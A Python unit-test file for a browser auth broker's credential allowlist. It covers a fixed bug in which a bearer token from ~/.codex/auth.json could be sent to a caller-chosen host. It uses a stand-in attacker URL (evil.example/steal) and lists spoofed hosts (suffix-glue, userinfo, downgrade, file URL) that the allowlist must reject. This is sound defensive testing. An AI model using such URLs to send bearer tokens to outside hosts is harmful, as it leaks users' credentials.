"""Credential-egress allowlist for the browser broker.

Regression cover for the bearer-token exfiltration primitive: `crcp auth broker
--url <attacker>` attached the OpenAI bearer from ~/.codex/auth.json to a
caller-controlled host via the unscoped CDP `Network.setExtraHTTPHeaders`.

Every token literal here is synthetic. No test touches a real credential and no
test performs network I/O.
"""

from __future__ import annotations

import json
import unittest
from typing import Any
from unittest import mock

from crcp import auth_broker

FAKE_TOKEN = "sk-FAKE-SYNTHETIC-NOT-A-REAL-TOKEN-0000000000"
FAKE_ACCOUNT = "acct-fake-0000"

ALLOWED = "https://chatgpt.com/"
ATTACKER = "https://evil.example/steal"


class RecordingSession:
    """Stands in for CdpSession; records what would reach the browser."""

    def __init__(self) -> None:
        self.calls: list[tuple[str, dict[str, Any]]] = []
        self.credential_scoping = False
        self.stripped_credential_hops: list[str] = []

    def call(self, method, params=None, *, session=False):  # noqa: ANN001, ANN201
        self.calls.append((method, dict(params or {})))
        return {}

    def enable_credential_scoping(self) -> None:
        self.credential_scoping = True

    def extra_headers(self) -> dict[str, str]:
        for method, params in self.calls:
            if method == "Network.setExtraHTTPHeaders":
                return dict(params.get("headers") or {})
        return {}

    def sent_credential(self) -> bool:
        return any(
            key.lower() in auth_broker.CREDENTIAL_HEADER_NAMES
            for key in self.extra_headers()
        )


class FakeWebSocket:
    """Minimal ws double: replays a scripted server frame sequence."""

    def __init__(self, incoming: list[dict[str, Any]]) -> None:
        self.incoming = list(incoming)
        self.sent: list[dict[str, Any]] = []

    def send(self, raw: str) -> None:
        self.sent.append(json.loads(raw))

    def recv(self) -> str:
        return json.dumps(self.incoming.pop(0))


def _session_with_ws(ws: FakeWebSocket) -> auth_broker.CdpSession:
    """Build a CdpSession without touching __init__ (no browser required)."""
    session = auth_broker.CdpSession.__new__(auth_broker.CdpSession)
    session.ws = ws
    session._id = 0
    session.session_id = "sess-1"
    session.credential_scoping = False
    session.stripped_credential_hops = []
    return session


class TrustedHostPredicateTests(unittest.TestCase):
    def test_allowlisted_hosts_accepted(self) -> None:
        for url in (
            "https://chatgpt.com/",
            "https://chatgpt.com/backend-api/me",
            "https://ws.chatgpt.com/socket",
            "https://chat.openai.com/",
            "https://auth.openai.com/authorize",
        ):
            self.assertTrue(auth_broker.is_trusted_credential_url(url), url)

    def test_arbitrary_and_spoofed_hosts_rejected(self) -> None:
        for url in (
            ATTACKER,
            "http://127.0.0.1:9999/steal",
            "https://chatgpt.com.evil.example/",  # suffix-glue spoof
            "https://evil-chatgpt.com/",  # no dot boundary
            "https://chatgpt.com@evil.example/",  # userinfo spoof
            "http://chatgpt.com/",  # plaintext downgrade
            "file:///C:/Windows/win.ini",
            "",
        ):
            self.assertFalse(auth_broker.is_trusted_credential_url(url), url)


class AllowlistedHostTests(unittest.TestCase):
    """(a) allowlisted host -> credential header present."""

    def test_bearer_injected_for_allowlisted_url(self) -> None:
        session = RecordingSession()
        auth_broker.inject_bearer_headers(
            session, FAKE_TOKEN, FAKE_ACCOUNT, target_url=ALLOWED
        )
        headers = session.extra_headers()
        self.assertEqual(headers["Authorization"], f"Bearer {FAKE_TOKEN}")
        self.assertEqual(headers["ChatGPT-Account-Id"], FAKE_ACCOUNT)
        self.assertTrue(session.credential_scoping)


class ArbitraryHostTests(unittest.TestCase):
    """(b) arbitrary host -> credential ABSENT and the call refused."""

    def test_inject_refuses_untrusted_target(self) -> None:
        session = RecordingSession()
        with self.assertRaises(auth_broker.BrokerError) as ctx:
            auth_broker.inject_bearer_headers(
                session, FAKE_TOKEN, FAKE_ACCOUNT, target_url=ATTACKER
            )
        self.assertIn("refusing to attach", str(ctx.exception))
        self.assertFalse(session.sent_credential())
        self.assertEqual(session.calls, [])

    def test_failure_is_loud_and_leaks_no_token(self) -> None:
        with self.assertRaises(auth_broker.BrokerError) as ctx:
            auth_broker.require_trusted_credential_url(
                "https://evil.example/x?t=" + FAKE_TOKEN, what="--url start URL"
            )
        message = str(ctx.exception)
        self.assertIn("--url start URL", message)
        self.assertNotIn(FAKE_TOKEN, message)

    def test_scoped_headers_empty_for_untrusted(self) -> None:
        self.assertEqual(
            auth_broker.scoped_auth_headers(ATTACKER, FAKE_TOKEN, FAKE_ACCOUNT), {}
        )

    def test_run_broker_refuses_before_touching_browser_or_authjson(self) -> None:
        calls: list[str] = []

        def _boom(*_a: object, **_k: object) -> None:
            calls.append("side-effect")
            raise AssertionError("must not run for an untrusted --url")

        with (
            mock.patch.object(auth_broker, "launch_browser", _boom),
            mock.patch.object(auth_broker, "_load_auth_tokens", _boom),
            mock.patch.object(auth_broker, "CdpSession", _boom),
        ):
            with self.assertRaises(auth_broker.BrokerError) as ctx:
                auth_broker.run_broker(start_url=ATTACKER)
        self.assertIn("refusing to attach", str(ctx.exception))
        # The guard fired before the browser launched and before auth.json read.
        self.assertEqual(calls, [])

    def test_run_broker_allows_untrusted_url_when_bearer_skipped(self) -> None:
        """--no-bearer carries no credential, so it must stay usable."""
        reached: list[str] = []

        def _sentinel(*_a: object, **_k: object) -> None:
            reached.append("launch_browser")
            raise RuntimeError("sentinel: got past the allowlist guard")

        with mock.patch.object(auth_broker, "launch_browser", _sentinel):
            with self.assertRaises(RuntimeError) as ctx:
                auth_broker.run_broker(start_url=ATTACKER, skip_bearer=True)
        self.assertIn("sentinel", str(ctx.exception))
        self.assertEqual(reached, ["launch_browser"])


class RedirectTests(unittest.TestCase):
    """(c) redirect allowlisted -> arbitrary host -> credential DROPPED."""

    def test_strip_helper_drops_credentials_off_allowlist(self) -> None:
        sent = {
            "Authorization": f"Bearer {FAKE_TOKEN}",
            "ChatGPT-Account-Id": FAKE_ACCOUNT,
            "Accept": "application/json",
        }
        kept, stripped = auth_broker.strip_untrusted_credential_headers(ATTACKER, sent)
        self.assertTrue(stripped)
        self.assertEqual(kept, {"Accept": "application/json"})

    def test_strip_helper_keeps_credentials_on_allowlist(self) -> None:
        sent = {"Authorization": f"Bearer {FAKE_TOKEN}", "Accept": "*/*"}
        kept, stripped = auth_broker.strip_untrusted_credential_headers(ALLOWED, sent)
        self.assertFalse(stripped)
        self.assertEqual(kept, sent)

    def test_intercepted_redirect_hop_loses_the_bearer(self) -> None:
        """Hop 1 chatgpt.com keeps it; hop 2 evil.example is rewritten without."""
        paused_allowed = {
            "method": "Fetch.requestPaused",
            "params": {
                "requestId": "req-1",
                "request": {
                    "url": ALLOWED,
                    "headers": {
                        "Authorization": f"Bearer {FAKE_TOKEN}",
                        "Accept": "*/*",
                    },
                },
            },
        }
        paused_attacker = {
            "method": "Fetch.requestPaused",
            "params": {
                "requestId": "req-2",
                "request": {
                    "url": ATTACKER,
                    "headers": {
                        "Authorization": f"Bearer {FAKE_TOKEN}",
                        "chatgpt-account-id": FAKE_ACCOUNT,
                        "Accept": "*/*",
                    },
                },
            },
        }
        ws = FakeWebSocket([paused_allowed, paused_attacker, {"id": 1, "result": {}}])
        session = _session_with_ws(ws)

        session.call("Page.navigate", {"url": ALLOWED}, session=True)

        continues = [m for m in ws.sent if m["method"] == "Fetch.continueRequest"]
        self.assertEqual(len(continues), 2)

        # hop 1 (allowlisted): untouched, no header rewrite
        self.assertNotIn("headers", continues[0]["params"])

        # hop 2 (redirect target off-allowlist): rewritten WITHOUT credentials
        rewritten = {
            h["name"].lower(): h["value"] for h in continues[1]["params"]["headers"]
        }
        self.assertNotIn("authorization", rewritten)
        self.assertNotIn("chatgpt-account-id", rewritten)
        self.assertEqual(rewritten, {"accept": "*/*"})
        self.assertEqual(len(session.stripped_credential_hops), 1)

        # no frame anywhere on the wire may carry the token
        self.assertNotIn(FAKE_TOKEN, json.dumps(ws.sent))

    def test_interception_is_armed_for_every_url_at_request_stage(self) -> None:
        """Mutation cover: a narrowed Fetch pattern silently stops covering hops.

        Measured — emptying ``patterns`` left the whole suite GREEN before this
        test existed, because ``RecordingSession`` overrides
        ``enable_credential_scoping``. This exercises the REAL method.
        """
        ws = FakeWebSocket([{"id": 1, "result": {}}])
        session = _session_with_ws(ws)
        session.enable_credential_scoping()

        enables = [m for m in ws.sent if m["method"] == "Fetch.enable"]
        self.assertEqual(len(enables), 1)
        patterns = enables[0]["params"]["patterns"]
        self.assertEqual(patterns, [{"urlPattern": "*", "requestStage": "Request"}])
        self.assertTrue(session.credential_scoping)

    def test_untrusted_hop_always_gets_an_explicit_header_override(self) -> None:
        """Even with no visible credential, an off-allowlist hop is fully specified.

        ``Fetch.continueRequest.headers`` OVERRIDES the request header set. Gating
        the override on "we saw a credential" would leave the late-merge ordering
        of ``Network.setExtraHTTPHeaders`` able to re-add the bearer downstream.
        """
        paused = {
            "method": "Fetch.requestPaused",
            "params": {
                "requestId": "req-1",
                "request": {"url": ATTACKER, "headers": {"Accept": "*/*"}},
            },
        }
        ws = FakeWebSocket([paused, {"id": 1, "result": {}}])
        session = _session_with_ws(ws)
        session.call("Page.navigate", {"url": ALLOWED}, session=True)

        cont = [m for m in ws.sent if m["method"] == "Fetch.continueRequest"][0]
        self.assertIn("headers", cont["params"])
        names = {h["name"].lower() for h in cont["params"]["headers"]}
        self.assertFalse(names & set(auth_broker.CREDENTIAL_HEADER_NAMES))
        # Nothing was actually removed, so this is not reported as a stripped hop.
        self.assertEqual(session.stripped_credential_hops, [])

    def test_trusted_hop_gets_no_header_override(self) -> None:
        """An allowlisted hop must be left alone (no functional regression)."""
        paused = {
            "method": "Fetch.requestPaused",
            "params": {
                "requestId": "req-1",
                "request": {
                    "url": ALLOWED,
                    "headers": {"Authorization": f"Bearer {FAKE_TOKEN}"},
                },
            },
        }
        ws = FakeWebSocket([paused, {"id": 1, "result": {}}])
        session = _session_with_ws(ws)
        session.call("Page.navigate", {"url": ALLOWED}, session=True)

        cont = [m for m in ws.sent if m["method"] == "Fetch.continueRequest"][0]
        self.assertNotIn("headers", cont["params"])

    def test_nested_interception_does_not_break_response_matching(self) -> None:
        """Regression: nested sends must not desync the outer call's id match."""
        paused = {
            "method": "Fetch.requestPaused",
            "params": {
                "requestId": "req-1",
                "request": {"url": ATTACKER, "headers": {"Authorization": "Bearer x"}},
            },
        }
        ws = FakeWebSocket([paused, {"id": 1, "result": {"frameId": "f1"}}])
        session = _session_with_ws(ws)
        result = session.call("Page.navigate", {"url": ALLOWED}, session=True)
        self.assertEqual(result, {"frameId": "f1"})


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
